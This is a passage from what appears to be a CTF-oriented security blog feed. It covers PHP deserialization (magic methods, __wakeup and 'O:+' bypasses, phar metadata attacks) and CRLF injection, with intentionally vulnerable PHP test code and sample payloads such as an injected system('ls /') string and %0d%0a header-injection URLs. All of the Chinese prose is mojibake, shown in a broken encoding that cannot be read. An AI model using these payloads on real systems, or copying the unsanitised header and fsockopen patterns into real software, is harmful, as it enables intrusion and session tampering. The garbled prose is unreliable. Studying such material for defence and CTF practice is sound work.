        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>-&gt;<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
<span class="meta">?&gt;</span>
<span class="comment">//callxxx,a</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$arg1</span>,<span class="subst">$arg2</span>[0]&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$test</span>::<span class="title function_ invoke__">callxxx</span>(<span class="string">&#x27;a&#x27;</span>);
<span class="meta">?&gt;</span>
<span class="comment">//callxxx,a</span></code></pre>

<p>è¿™é‡Œå…ˆæ¥å­¦ä¹ ä¸€ä¸‹åŒå†’å·çš„ç”¨æ³•ï¼ŒåŒå†’å·ä¹Ÿå«åšèŒƒå›´è§£ææ“ä½œç¬¦ï¼ˆä¹Ÿå¯ç§°ä½œ Paamayim Nekudotayimï¼‰æˆ–è€…æ›´ç®€å•åœ°è¯´æ˜¯ä¸€å¯¹å†’å·ï¼Œå¯ä»¥ç”¨äºè®¿é—®é™æ€æˆå‘˜ï¼Œç±»å¸¸é‡ï¼Œè¿˜å¯ä»¥ç”¨äºè¦†ç›–ç±»ä¸­çš„å±æ€§å’Œæ–¹æ³•ã€‚è‡ª PHP 5.3.0 èµ·ï¼Œå¯ä»¥é€šè¿‡å˜é‡æ¥å¼•ç”¨ç±»ï¼Œè¯¥å˜é‡çš„å€¼ä¸èƒ½æ˜¯å…³é”®å­—ï¼ˆå¦‚ selfï¼Œparent å’Œ staticï¼‰ã€‚ä¸**__call<strong>ä¸åŒçš„æ˜¯éœ€è¦æ·»åŠ </strong>static**ï¼Œåªæœ‰è®¿é—®ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ‰ä¼šè§¦å‘ã€‚</p>
<h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a><code>__clone()</code></h3><p><code>__clone()</code>:å½“ä½¿ç”¨cloneå…³é”®å­—æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡åï¼Œæ–°å¯¹è±¡å°±ä¼šè°ƒç”¨å®šä¹‰çš„é­”æœ¯æ–¹æ³•(å¦‚æœå­˜åœ¨)</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);
<span class="meta">?&gt;</span>
<span class="comment">//__clone test</span></code></pre>



<h3 id="isset-å’Œ-unset"><a href="#isset-å’Œ-unset" class="headerlink" title="__isset()å’Œ__unset"></a><code>__isset()</code>å’Œ<code>__unset</code></h3><p><code>__isset()</code>:å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<code>isset()</code>æˆ–è€…<code>empty()</code>æ—¶ï¼Œ<code>__isset()</code>ä¼šè¢«è°ƒç”¨</p>
<p><code>__unset()</code>:å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨<code>unset()</code>æ—¶ï¼Œ<code>__unset()</code>ä¼šè¢«è§¦å‘</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">private</span> <span class="variable">$var</span>;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">isset</span>(<span class="variable">$test</span>-&gt;var1);
<span class="meta">?&gt;</span>
    <span class="comment">//var1</span></code></pre>

<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;
    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="keyword">echo</span> <span class="variable">$arg1</span>;
    &#125;

&#125;
<span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();
<span class="keyword">unset</span>(<span class="variable">$test</span>-&gt;var1);
<span class="meta">?&gt;</span>
    <span class="comment">//var1</span></code></pre>



<h2 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h2><h3 id="ç»•è¿‡-wakeup"><a href="#ç»•è¿‡-wakeup" class="headerlink" title="ç»•è¿‡ __wakeup:"></a>ç»•è¿‡ __wakeup:</h3><ul>
<li>PHP5 &lt; 5.6.25</li>
<li>PHP7 &lt; 7.0.10</li>
</ul>
<p>å½“åºåˆ—åŒ–åå¯¹è±¡çš„å‚æ•°åˆ—è¡¨ä¸­æˆå‘˜ä¸ªæ•°å’Œå®é™…ä¸ªæ•°ä¸ç¬¦åˆæ—¶ä¼šç»•è¿‡ __wakeup()</p>
<p>&#x2F;&#x2F;è¯¦è§[SWPUCTF 2021 æ–°ç”Ÿèµ›]no_wakeup</p>
<p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥é€šè¿‡èµ‹å€¼æ¥ç»•è¿‡__wakeä¸‹é¢å°†æ‰§è¡Œçš„å­—ç¬¦ä¸²ç½®ç©ºçš„æƒ…å†µ</p>
<p>ä½¿å¦ä¸€ä¸ªæ„é€ å¥½çš„å˜é‡å’Œè¢«æ§åˆ¶çš„å˜é‡å…¬ç”¨ä¸€ä¸ªå†…å­˜å¦‚</p>
<pre><code class="highlight plaintext">$t-&gt;c=&quot;system(&#x27;ls /&#x27;);&quot;;
$t-&gt;b=&amp;$t-&gt;a;
//aæœªè¢«wakeupç½®ç©ºçš„å˜é‡ï¼Œæ‰§è¡Œçš„ä¹Ÿæ˜¯a,å‰é¢è¿˜æœ‰ä¸€ä¸ªc-&gt;bçš„è¿‡ç¨‹</code></pre>



<h3 id="ç»•è¿‡-O"><a href="#ç»•è¿‡-O" class="headerlink" title="ç»•è¿‡ O"></a>ç»•è¿‡ O</h3><p>æœ‰æ—¶ä¼šå¯¹æ„é€ çš„payloadè¿›è¡Œæ­£åˆ™åŒ¹é…</p>
<p>æ­¤æ—¶éœ€è¦ç»•è¿‡ä¸€äº›å¿…é¡»ç»•è¿‡çš„å…³é”®è¯ï¼Œå¦‚O</p>
<pre><code class="highlight plaintext">æ£€æŸ¥Oå¼€å¤´çš„è¯ï¼Œå¯ä»¥å°è¯•æ•°ç»„ç»•è¿‡
serialize(array(new Test()))
å¦‚æœæ˜¯åœ¨æ•´ä¸ªå­—ç¬¦ä¸²ä¸­æ£€æŸ¥çš„è¯ï¼Œé‚£æ²¡å¾—è·‘
å°è¯•ç”¨ä¸€ä¸‹O+çš„æ–¹æ³•ç»•è¿‡
O:4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125; =&gt;O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;&#125;</code></pre>



<p>gcæœºåˆ¶</p>
<h2 id="é­”æœ¯æ–¹æ³•çš„ç›¸äº’åˆ¶è¡¡"><a href="#é­”æœ¯æ–¹æ³•çš„ç›¸äº’åˆ¶è¡¡" class="headerlink" title="é­”æœ¯æ–¹æ³•çš„ç›¸äº’åˆ¶è¡¡"></a>é­”æœ¯æ–¹æ³•çš„ç›¸äº’åˆ¶è¡¡</h2><h3 id="wakeup-unserialize"><a href="#wakeup-unserialize" class="headerlink" title="__wakeup()&amp;__unserialize()"></a><code>__wakeup()&amp;__unserialize()</code></h3><p>ä»7.4.0å¼€å§‹ï¼Œå¦‚æœç±»ä¸­åŒæ—¶å®šä¹‰äº† <code>__unserialize() å’Œ __wakeup()</code> ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ï¼Œåˆ™åªæœ‰ <code>__unserialize()</code> æ–¹æ³•ä¼šç”Ÿæ•ˆï¼Œ__wakeup() æ–¹æ³•ä¼šè¢«å¿½ç•¥</p>
<h2 id="æ„é“¾ç»éªŒ"><a href="#æ„é“¾ç»éªŒ" class="headerlink" title="æ„é“¾ç»éªŒ:"></a>æ„é“¾ç»éªŒ:</h2><p>é¦–å…ˆï¼Œæ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œæ³¨å…¥ç‚¹ä¸€èˆ¬ è¢«åŒ…è£¹åœ¨æœ€å†…éƒ¨(å› ä¸ºç¬¬ä¸€ä¸ªæ‰§è¡Œï¼Œé€šè¿‡å„ç§é­”æœ¯æ–¹æ³•å°†ç»“æœæˆåŠŸä¼ è¾“åˆ°å¤–éƒ¨å¹¶æˆåŠŸé”€æ¯å¯¹è±¡)ï¼Œæ¥ç€å†…å±‚çš„é­”æœ¯æ–¹æ³•è¦åœ¨ç´§é‚»çš„å¤–å±‚å¾—åˆ°è§¦å‘ï¼Œ(ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä»–è¢«ç§°ä¸ºpopé“¾çš„ç¼˜æ•…)ï¼Œæœ€åæˆåŠŸé”€æ¯å°±ç®—popé“¾æ„é€ æˆåŠŸäº†</p>
<h2 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h2><p><code>æ–‡ä»¶ä¸Šä¼ +æ–‡ä»¶åŒ…å«+phpååºåˆ—åŒ–</code>çš„å‘½è¿å…±åŒä½“(é›¾)</p>
<p>å…ˆäº†è§£ä¸€ä¸‹<code>phar</code>æ–‡ä»¶</p>
<h3 id="pharæ–‡ä»¶ç»“æ„"><a href="#pharæ–‡ä»¶ç»“æ„" class="headerlink" title="pharæ–‡ä»¶ç»“æ„"></a>pharæ–‡ä»¶ç»“æ„</h3><ul>
<li><strong>stubæ–‡ä»¶æ ‡è¯†</strong></li>
</ul>
<p>å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ ‡å¿—ï¼Œæ ¼å¼ä¸ºxxx<code>&lt;?php xxx; __HALT_COMPILER();?&gt;</code>ï¼Œå‰é¢å†…å®¹ä¸é™ï¼Œä½†å¿…é¡»ä»¥<code>__HALT_COMPILER();</code>æ¥ç»“å°¾ï¼Œå¦åˆ™pharæ‰©å±•å°†æ— æ³•è¯†åˆ«è¿™ä¸ªæ–‡ä»¶ä¸ºpharæ–‡ä»¶</p>
<ul>
<li><strong>manifest</strong></li>
</ul>
<p>Pharæ–‡ä»¶ä¸­è¢«å‹ç¼©çš„æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå…¶ä¸­Meta-dataéƒ¨åˆ†çš„ä¿¡æ¯ä¼šä»¥åºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜ï¼ˆå½“æ–‡ä»¶æ“ä½œå‡½æ•°é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æ<code>phar</code>æ–‡ä»¶æ—¶å°±ä¼šå°†æ•°æ®ååºåˆ—åŒ–(æ¼æ´åˆ©ç”¨ç‚¹)</p>
<p><img src="/2025/03/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/kisakiayano/source/_posts/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1937992-20200602115238195-49897280.png" alt="1937992-20200602115238195-49897280"></p>
<ul>
<li><strong>contents</strong></li>
</ul>
<p>è¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹ï¼Œåœ¨æ²¡æœ‰ç‰¹æ®Šè¦æ±‚çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè¢«å‹ç¼©çš„æ–‡ä»¶å†…å®¹å¯ä»¥éšä¾¿å†™çš„ï¼Œå› ä¸ºæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¸»è¦æ˜¯ä¸ºäº†è§¦å‘å®ƒçš„ååºåˆ—åŒ–</p>
<ul>
<li><strong>signature</strong></li>
</ul>
<p>å¦‚æœä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼Œç­¾åå°±ä¼šå¤±æ•ˆï¼Œéœ€è¦æ›´æ¢ä¸€ä¸ªæ–°çš„ç­¾åï¼Œåœ¨æ–‡ä»¶ç³»ç»Ÿå‡½æ•°(<code>file_exist(),is_dir()</code>ç­‰)å‚æ•°å¯æ§çš„æƒ…å†µä¸‹ï¼Œé…åˆpharä¼ªåè®®å°±å¯ä»¥ä¸ä¾èµ–<code>unserialiaze()</code>ç›´æ¥è¿›è¡Œååºåˆ—åŒ–</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1937992-20200602115337297-1986136175.png" alt="1937992-20200602115337297-1986136175"></p>
<blockquote>
<p>[!NOTE]</p>
<p>è¦å°†<code>php.ini</code>ä¸­çš„<code>phar.readonly</code>é€‰é¡¹è®¾ç½®ä¸ºOFFï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆ</p>
</blockquote>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;
    &#125;
    
    <span class="comment">//@unlink(&quot;phar.phar&quot;);</span>
    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub,æœ‰æ—¶+ä¸€ä¸ªGIF89aå¤´åœ¨å‰é¢ç»•è¿‡</span>
    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span>
    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span>
    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();
<span class="meta">?&gt;</span></code></pre>

<p>phpä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹</p>
<table>
<thead>
<tr>
<th>å—å½±å“å‡½æ•°çš„åˆ—è¡¨</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>fileatime</td>
<td>filectime</td>
<td>file_exists</td>
<td>file_get_contents</td>
</tr>
<tr>
<td>file_put_contents</td>
<td>file</td>
<td>filegroup</td>
<td>fopen</td>
</tr>
<tr>
<td>fileinode</td>
<td>filemtime</td>
<td>fileowner</td>
<td>fileperms</td>
</tr>
<tr>
<td>is_dir</td>
<td>is_executable</td>
<td>is_file</td>
<td>is_link</td>
</tr>
<tr>
<td>is_readable</td>
<td>is_writable</td>
<td>is_writeab</td>
<td>parse_ini_file</td>
</tr>
<tr>
<td>copy</td>
<td>unlink</td>
<td>stat</td>
<td>readfile</td>
</tr>
</tbody></table>
<h2 id="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"></a>ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</h2>]]></content>
      <tags>
        <tag>-web -CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLFæ³¨å…¥æ¼æ´</title>
    <url>/2025/07/14/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="CRLFæ³¨å…¥æ¼æ´"><a href="#CRLFæ³¨å…¥æ¼æ´" class="headerlink" title="CRLFæ³¨å…¥æ¼æ´"></a>CRLFæ³¨å…¥æ¼æ´</h1><p>CRLFï¼Œæ„Ÿè§‰å¥½é«˜çº§çš„åè¯å•Šã€‚ã€‚</p>
<p>ä½†æ˜¯å¦‚æœæˆ‘å‘Šè¯‰ä½ CRæ˜¯å›è½¦ï¼ŒLFæ˜¯æ¢è¡Œï¼Œæ˜¯ä¸æ˜¯æ„Ÿè§‰å°±å¥½å¤šäº†?</p>
<h2 id="CRLFæ˜¯æ€ä¹ˆé€ æˆæ¼æ´çš„å‘¢"><a href="#CRLFæ˜¯æ€ä¹ˆé€ æˆæ¼æ´çš„å‘¢" class="headerlink" title="CRLFæ˜¯æ€ä¹ˆé€ æˆæ¼æ´çš„å‘¢"></a>CRLFæ˜¯æ€ä¹ˆé€ æˆæ¼æ´çš„å‘¢</h2><p>åœ¨HTTPåè®®ä¸­ï¼ŒHTTP Header éƒ¨åˆ†ä¸ HTTP Body éƒ¨åˆ†æ˜¯ç”¨ä¸¤ä¸ªCRLFåˆ†éš”çš„ï¼Œæµè§ˆå™¨å°±æ˜¯æ ¹æ®è¿™ä¸¤ä¸ªCRLFæ¥å–å‡ºHTTP å†…å®¹å¹¶æ˜¾ç¤ºå‡ºæ¥ã€‚æ‰€ä»¥ï¼Œä¸€æ—¦æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ HTTP æ¶ˆæ¯å¤´ä¸­çš„å­—ç¬¦ï¼Œæ³¨å…¥ä¸€äº›æ¶æ„çš„æ¢è¡Œï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æ³¨å…¥ä¸€äº›æ¶æ„çš„HTTP Headerï¼Œå¦‚ä¼šè¯Cookieï¼Œç”šè‡³å¯ä»¥æ³¨å…¥ä¸€äº›HTMLä»£ç ã€‚è¿™å°±æ˜¯CRLFæ³¨å…¥æ¼æ´çš„æ ¸å¿ƒåŸç†ã€‚</p>
<p>åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¦‚æœWebåº”ç”¨æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥åšä¸¥æ ¼éªŒè¯ï¼Œä¾¿ä¼šå¯¼è‡´æ”»å‡»è€…å¯ä»¥è¾“å…¥ä¸€äº›æ¶æ„å­—ç¬¦ã€‚æ”»å‡»è€…ä¸€æ—¦å‘è¯·æ±‚è¡Œæˆ–é¦–éƒ¨ä¸­çš„å­—æ®µæ³¨å…¥æ¶æ„çš„CRLFï¼Œå°±èƒ½æ³¨å…¥ä¸€äº›é¦–éƒ¨å­—æ®µæˆ–æŠ¥æ–‡ä¸»ä½“ï¼Œå¹¶åœ¨å“åº”ä¸­è¾“å‡ºï¼Œæ‰€ä»¥CRLFæ³¨å…¥æ¼æ´åˆç§°ä¸ºHTTPå“åº”æ‹†åˆ†æ¼æ´ï¼ˆHTTP Response Splittingï¼‰ï¼Œç®€ç§°HRSã€‚</p>
<h2 id="Locationå­—æ®µçš„302è·³è½¬"><a href="#Locationå­—æ®µçš„302è·³è½¬" class="headerlink" title="Locationå­—æ®µçš„302è·³è½¬"></a>Locationå­—æ®µçš„302è·³è½¬</h2><p><code>Location</code>å­—æ®µï¼Œè¯´å®è¯æˆ‘ä¹Ÿä¸ç†Ÿæ‚‰ï¼Œå“åº”å¤´è¿™å—æ²¡ä»”ç»†çš„å»äº†è§£è¿‡</p>
<p>äº†è§£åçŸ¥é“<strong>Location</strong> å“åº”å¤´ç”¨äºæŒ‡å®šéœ€è¦å°†é¡µé¢é‡æ–°å®šå‘è‡³çš„åœ°å€ã€‚å®ƒé€šå¸¸åœ¨å“åº”ç ä¸º <strong>3xx</strong> çš„å“åº”ä¸­æ‰æœ‰æ„ä¹‰ï¼Œä¾‹å¦‚ <strong>301 (æ°¸ä¹…é‡å®šå‘)<strong>ã€</strong>302 (ä¸´æ—¶é‡å®šå‘)<strong>ã€</strong>303 (See Also)<strong>ã€</strong>307 (Temporary Redirect)</strong> å’Œ <strong>308 (Permanent Redirect)</strong></p>
<p>ä¸€èˆ¬ç½‘ç«™ä¼šåœ¨HTTPå¤´ä¸­ä½¿ç”¨<code>Location: http://baidu.com</code> è¿™ç§æ–¹å¼æ¥è¿›è¡Œ302è·³è½¬ï¼Œå¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶ <code>Location:</code> åé¢çš„æŸä¸ªç½‘å€çš„URLï¼Œå°±å¯ä»¥è¿›è¡ŒCRLFæ”»å‡»ã€‚</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]))&#123;

    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&quot;url&quot;</span>]);
    <span class="keyword">exit</span>;
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>è¿™æ®µä»£ç çš„æ„æ€æ˜¯ï¼šå½“æ¡ä»¶æ»¡è¶³æ—¶ï¼Œå°†è¯·æ±‚åŒ…ä¸­çš„urlå‚æ•°å€¼æ‹¼æ¥åˆ°Locationå­—ç¬¦ä¸²ä¸­ï¼Œå¹¶è®¾ç½®æˆå“åº”å¤´å‘é€ç»™å®¢æˆ·ç«¯ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬è¾“å…¥æ­£å¸¸çš„urlï¼š<code>/?url=https://ayan0.top</code></p>
<p>å¾—åˆ°ä¸€ä¸ªæ­£å¸¸çš„302è·³è½¬åŒ…çš„å“åº”å¤´æ˜¯è¿™æ ·çš„:</p>
<pre><code class="highlight http"><span class="meta">HTTP/1.1</span> <span class="number">302</span> Moved Temporarily
<span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.15.11
<span class="attribute">Date</span><span class="punctuation">: </span>Mon, 14 Jul 2025 06:39:25 GMT
<span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html
<span class="attribute">Connection</span><span class="punctuation">: </span>close
<span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.3.29
<span class="attribute">Location</span><span class="punctuation">: </span>https://ayan0.top
<span class="attribute">Content-Length</span><span class="punctuation">: </span>880</code></pre>

<p>ä½†å¦‚æœæˆ‘ä»¬æŠ“åŒ…ï¼Œå°†è¾“å…¥çš„URLæ”¹ä¸º <code>/?url=https://ayan0.top%0d%0aPHPSESSID=whoami</code>ï¼Œæ³¨å…¥äº†ä¸€ä¸ªæ¢è¡Œã€‚å°†ä¿®æ”¹åçš„è¯·æ±‚åŒ…æäº¤ç»™æœåŠ¡å™¨ç«¯ï¼ŒæŸ¥çœ‹æœåŠ¡å™¨ç«¯çš„å“åº”ã€‚é¢„æœŸå†…è¿”å›åŒ…çš„<strong>å“åº”å¤´</strong>å°±ä¼šå˜æˆè¿™æ ·ï¼š</p>
<pre><code class="highlight http"><span class="meta">HTTP/1.1</span> <span class="number">302</span>  Moved Temporarily  
Content- Type: text/html
<span class="attribute">Content-Length</span><span class="punctuation">: </span>88
<span class="attribute">Date</span><span class="punctuation">: </span>Mon, 14 Jul 2025 06:39:25 GMT
<span class="attribute">Connection</span><span class="punctuation">: </span>close
<span class="attribute">Location</span><span class="punctuation">: </span>https://ayan0.top
<span class="attribute">Set-Cookie</span><span class="punctuation">: </span>PHPSESSID=whoami</code></pre>

<p>ä½†æ˜¯çœŸçš„å¦‚æ­¤ï¼Œå—</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250714145107226.png" alt="image-20250714145107226"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå‡ºç°äº†æŠ¥é”™ï¼Œå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬çš„æ¢è¡Œç¬¦è¢«æ¢æµ‹å‡ºæ¥äº†ã€‚</p>
<p>ç½‘ä¸Šæ‰¾äº†ä¸€äº›åšå®¢ï¼Œå‘ç°å¾ˆå¤šå¸ˆå‚…ä¹Ÿé‡ä¸Šäº†åŒæ ·çš„é—®é¢˜ï¼Œå¹¶ä¸”è¿™ä¸ªé—®é¢˜åœ¨5.x-7.xå†…æ˜¯éƒ½å­˜åœ¨çš„</p>
<p>çœ‹èµ·æ¥æ˜¯å› ä¸ºè¿™ä¸ªæ¼æ´å·²ç»è¢«ä¿®å¤äº†ï¼Œå¹¶ä¸”åœ¨Nodejsä¸­ä¹Ÿæ— æ³•å¾—åˆ°å¤ç°å‘œå‘œ</p>
<h2 id="PHP-fsockopen-å‡½æ•°"><a href="#PHP-fsockopen-å‡½æ•°" class="headerlink" title="PHP fsockopen() å‡½æ•°"></a>PHP fsockopen() å‡½æ•°</h2><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> ç”¨äºæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnix å¥—æ¥å­—è¿æ¥ï¼Œåˆå§‹åŒ–ä¸€ä¸ªå¥—æ¥å­—è¿æ¥åˆ°æŒ‡å®šä¸»æœºï¼ˆhostnameï¼‰ï¼Œå®ç°å¯¹ç”¨æˆ·æŒ‡å®šurlæ•°æ®çš„è·å–ã€‚è¯¥å‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œè¿›è¡Œä¼ è¾“åŸå§‹æ•°æ®ã€‚<br>fsockopen()å°†è¿”å›ä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä¹‹åå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶ç±»å‡½æ•°è°ƒç”¨ï¼ˆä¾‹å¦‚ï¼šfgets()ï¼Œfgetss()ï¼Œfwrite()ï¼Œfclose()è¿˜æœ‰feof()ï¼‰ã€‚å¦‚æœè°ƒç”¨å¤±è´¥ï¼Œå°†è¿”å›falseã€‚</p>
<p>æµ‹è¯•ä»£ç ï¼š</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];
<span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);
<span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;
    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;
&#125; <span class="keyword">else</span> &#123;
    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;
    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;
    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;
    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);
    <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;
        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);
    &#125;
    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
&#125;
<span class="meta">?&gt;</span></code></pre>

<p>é¦–å…ˆæˆ‘ä»¬å°è¯•è®¿é—®æ­£å¸¸çš„urlï¼š</p>
<pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999</code></pre>

<p>VPS ä¸Šç›‘å¬åˆ°çš„è¯·æ±‚ï¼š</p>
<pre><code class="highlight plaintext">Connection received on 60.1x.1xx.1xx 40605
GET / HTTP/1.1
Host: 47.1xx.1x1.1xx:9999
Connection: Close</code></pre>

<h3 id="åœ¨Hostå¤´éƒ¨æ³¨å…¥"><a href="#åœ¨Hostå¤´éƒ¨æ³¨å…¥" class="headerlink" title="åœ¨Hostå¤´éƒ¨æ³¨å…¥"></a>åœ¨Hostå¤´éƒ¨æ³¨å…¥</h3><p>ä¸‹é¢æˆ‘ä»¬å°è¯•æ’å…¥ CRLFï¼š</p>
<pre><code class="highlight plaintext">/?url=47.1xx.1x1.1xx:9999%0d%0aSet-Cookie: PHPSESSID=whoami</code></pre>

